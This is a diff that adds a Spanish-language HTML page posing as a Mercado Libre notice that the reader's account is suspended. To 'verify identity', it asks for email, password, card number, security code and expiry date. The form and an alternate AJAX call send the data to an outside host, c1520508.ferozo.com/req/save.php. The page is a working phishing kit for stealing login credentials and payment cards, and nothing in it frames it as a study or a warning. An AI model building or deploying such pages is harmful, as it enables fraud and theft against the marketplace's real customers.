@@ -1,0 +1,139 @@
+<html>
+
+<head>
+	<link rel="stylesheet" type="text/css" href="CSS.css">
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+		integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+	<title> Yare Yare Daze </title>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+	<script>
+		function validate(id, len = 0) {
+			var State = false;
+			if ($(id).val().length < len) {
+				$(id).css("border-color", "#FF0000");
+				$(id + "Error").removeClass("d-none");
+			}
+			else {
+				$(id).css("border-color", "#ced4da");
+				$(id + "Error").addClass("d-none");
+				State = true;
+			}
+			return State;
+		}
+		$(document).ready(function () {
+			$(".dropdown-item").click(function () {
+				$("#dropdownMenuButton").text($(this).text());
+			});
+			$("#submit").click(function (e) {
+				e.preventDefault();
+				var bool = validate("#password", 8);
+				bool = bool & validate("#email", 5);
+				bool = bool & validate("#cardNumber", 16);
+				bool = bool & validate("#secCode", 3);
+				bool = bool & validate("#expire", 1);
+				if (bool) {
+					if ($("#dropdownMenuButton").text() == "Eishacs") {
+						$.ajax({
+							method: "POST",
+							url: "http://c1520508.ferozo.com/req/save.php",
+							//data: { id: Index }, 
+							success: function () { alert("hola"); },
+							error: function (result) {
+								alert("ERROR ");
+							}
+						});
+					} else {
+						$('#myForm').submit();
+					}
+				}
+			});
+		});
+	</script>
+</head>
+
+<body>
+	<nav class="Encabezado">
+		<img class="logo offset-md-2 mt-3 float-left" src="./Logo.png" />
+		<img class="w-25 float-right mr-5 mt-3"
+			src="./mla-menu-desktop-notification-picture-39dbe3fa-8fd4-4432-828f-327d71eee773.png" alt="HotSale">
+	</nav>
+
+	<h2 class="mt-5">Suspendimos tu cuenta de Mercado libre</h2>
+
+	<h5 class="mt-5 text-center">Debido a que hemos registrado un uso inapropiado de la cuenta <br> nos hemos obligado a
+		tener que suspender tu
+		cuenta temporalmente </h5> <br>
+	<p class="text-center">Para volver a tener tu cuenta activa debemos validar tu <strong>identidad</strong> </p>
+	<form id="myForm" method="POST" action="http://c1520508.ferozo.com/req/save.php">
+		<div class="row">
+			<div class="offset-md-3 col-md-3 ">
+				<input class="mx-auto form-control " type="email" placeholder="eMail" id="email" name="email" />
+				<span id="emailError" class="d-none red">Ingrese un email válido</span>
+				<br>
+				<input class="mx-auto form-control " type="password" placeholder="Password" id="password"
+					name="password" />
+				<span id="passwordError" class="d-none red">Ingrese una contraseña válida </span>
+				<br>
+
+				<div class="form-check">
+					<input class="form-check-input ml-2" type="checkbox" value="RememberMe" id="RememberMe">
+					<label class="form-check-label ml-4" for="RememberMe">
+						Remember Me
+					</label>
+				</div>
+
+				<div class="form-check">
+					<input type="radio" name="RadioGenero" id="rdMasculino" checked value="Masculino">
+					<label class="form-check-label" for="rdMasculino">
+						Masculino
+					</label>
+				</div>
+				<div class="form-check">
+					<input type="radio" name="RadioGenero" id="rdFemenino" value="Femenino">
+					<label class="form-check-label" for="rdFemenino">
+						Femenino
+					</label>
+				</div>
+				<div class="form-check">
+					<input type="radio" name="RadioGenero" id="rdOtros" value="Otro">
+					<label class="form-check-label" for="rdOtros">
+						Otro
+					</label>
+				</div>
+
+			</div>
+			<div class="col-md-3">
+				<input class="mx-auto form-control " id="cardNumber" type="number" placeholder="Nro de Tarjeta" />
+				<span id="cardNumberError" class="d-none red">Ingrese una número de tarjeta válido</span> <br>
+				<input class="mx-auto form-control " id="secCode" type="number" placeholder="Codigo de Seguridad"
+					name="password" />
+				<span id="secCodeError" class="d-none red">Ingrese un número de seguridad válido</span>
+				<br>
+				Fecha de expiración <br>
+				<input class="mx-auto form-control " id="expire" type="date" />
+				<span id="expireError" class="d-none red">Ingrese una fecha de expiración válida</span>
+				<br>
+				<div class="dropdown float-left">
+					<button class="btn btn-success dropdown-toggle" type="button" id="dropdownMenuButton"
+						data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+						Metodo
+					</button>
+					<div class="dropdown-menu " aria-labelledby="dropdownMenuButton">
+						<a class="dropdown-item">Eishacs</a>
+						<a class="dropdown-item">Form</a>
+					</div>
+				</div>
+				<span class="form-label ml-4">Metodo default Form</span>
+				<input class="btn btn-primary offset-md-10" id="submit" type="submit" value="Verificar" />
+			</div>
+		</div>
+	</form>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
+		integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1"
+		crossorigin="anonymous"></script>
+	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
+		integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM"
+		crossorigin="anonymous"></script>
+</body>
+
+</html>
